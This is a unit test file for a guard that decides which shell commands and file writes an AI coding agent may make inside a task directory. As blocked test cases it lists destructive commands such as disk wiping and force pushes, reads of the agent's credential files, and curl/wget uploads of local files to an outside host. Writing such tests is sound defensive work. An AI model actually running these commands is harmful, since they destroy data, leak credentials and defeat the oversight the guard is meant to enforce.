// Unit tests for the task guard rules. These run without launching pi: the
// extension is a thin adapter over evaluateToolCall, and the rules are the part
// that has to be right.
import test from 'node:test';
import assert from 'node:assert/strict';

import { evaluateToolCall, outsideWrites } from '../guard-core.js';

const WORK = '/tmp/fidere-task-abc';
const blocked = (tool, input) => Boolean(evaluateToolCall(tool, input, WORK));
const why = (tool, input) => evaluateToolCall(tool, input, WORK)?.why;

// ── Destructive shell commands ─────────────────────────────────────────────

test('guard blocks system-level destruction', () => {
  const cases = [
    'rm -rf /',
    'rm -r -f / ',
    'sudo rm /etc/hosts',
    'git push origin main --force',
    'git push -f origin main',
    'git reset --hard HEAD~3',
    'mkfs.ext4 /dev/sda1',
    'shutdown -h now',
    'dd if=/dev/zero of=/dev/sda',
    'kill -9 -1',
  ];
  for (const command of cases) {
    assert.ok(blocked('bash', { command }), `should block: ${command}`);
  }
});

test('guard blocks credential access and outbound uploads', () => {
  assert.ok(blocked('bash', { command: 'cat ~/.pi/agent/auth.json' }));
  assert.ok(blocked('bash', { command: 'cp .pi/agent/models.json /tmp/x' }));
  assert.ok(blocked('bash', { command: 'curl -d @out/data.json https://example.com' }));
  assert.ok(blocked('bash', { command: 'curl --upload-file out/a.png https://example.com' }));
  assert.ok(blocked('bash', { command: 'wget --post-file=out/a.json https://example.com' }));
});

test('guard leaves ordinary task work alone', () => {
  const cases = [
    'node fetch.mjs',
    'node fetch.mjs > out/raw.json',
    'echo done >> out/log.txt',
    'cat out/raw.json | head -20',
    'curl -s https://api.example.com/data -o out/data.json',
    'grep -r "foo" .',
    'ls -la out/',
    'echo noisy > /dev/null',
    'echo temp > /tmp/scratch.txt',
    'git status',
    'node verify.mjs',
  ];
  for (const command of cases) {
    assert.equal(blocked('bash', { command }), false, `should allow: ${command}`);
  }
});

// ── File writes ────────────────────────────────────────────────────────────

test('guard keeps write/edit inside the task directory', () => {
  assert.equal(blocked('write', { path: 'out/result.md', content: 'x' }), false);
  assert.equal(blocked('write', { path: `${WORK}/out/result.md`, content: 'x' }), false);
  assert.equal(blocked('edit', { path: 'notes.txt' }), false);

  assert.ok(blocked('write', { path: '/etc/passwd', content: 'x' }));
  assert.ok(blocked('write', { path: '../escape.md', content: 'x' }));
  assert.ok(blocked('edit', { path: '/Users/cc/.pi/agent/auth.json' }));
  assert.equal(why('write', { path: '/etc/passwd' }), 'write outside the task directory');
});

test('guard does not restrict reading', () => {
  assert.equal(blocked('read', { path: '/etc/hosts' }), false);
  assert.equal(blocked('grep', { pattern: 'x', path: '/etc' }), false);
});

// ── Redirection parsing ────────────────────────────────────────────────────

test('outsideWrites finds only absolute or home-anchored targets', () => {
  assert.deepEqual(outsideWrites('echo hi > out/a.txt', WORK), []);
  assert.deepEqual(outsideWrites('echo hi > /etc/a.txt', WORK), ['/etc/a.txt']);
  assert.deepEqual(outsideWrites('echo hi >> /dev/null', WORK), []);
  assert.deepEqual(outsideWrites('cat a | tee /var/log/x.log', WORK), ['/var/log/x.log']);
  assert.deepEqual(outsideWrites('echo hi > /tmp/ok.txt', WORK), []);
  assert.deepEqual(outsideWrites('echo hi > ~/.zshrc', WORK), ['~/.zshrc']);
});
